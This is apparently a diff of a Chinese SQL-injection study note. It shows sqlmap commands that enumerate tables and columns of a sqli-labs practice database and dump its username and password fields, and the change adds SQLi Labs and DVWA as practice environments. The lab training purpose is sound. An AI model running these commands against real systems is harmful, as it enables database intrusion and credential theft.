@@ -46,8 +46,12 @@ sqlmap语句
 python sqlmap.py -u 10.101.143.198/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security(数据库名) --tables --batch -v 0    //爆表
 python sqlmap.py -u 10.101.143.198/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security -T users（表名） --columns --batch -v 0    //爆字段
 python sqlmap.py -u 10.101.143.198/sqli-labs/Less-1/?id=1 --technique UE --dbms mysql -D security -T users -C username,password（字段名） --dump --batch -v 0    //爆值
-
 ```
+
+* #### 推荐练习环境
+
+* SQLi Labs
+* DVWA
 
 
 
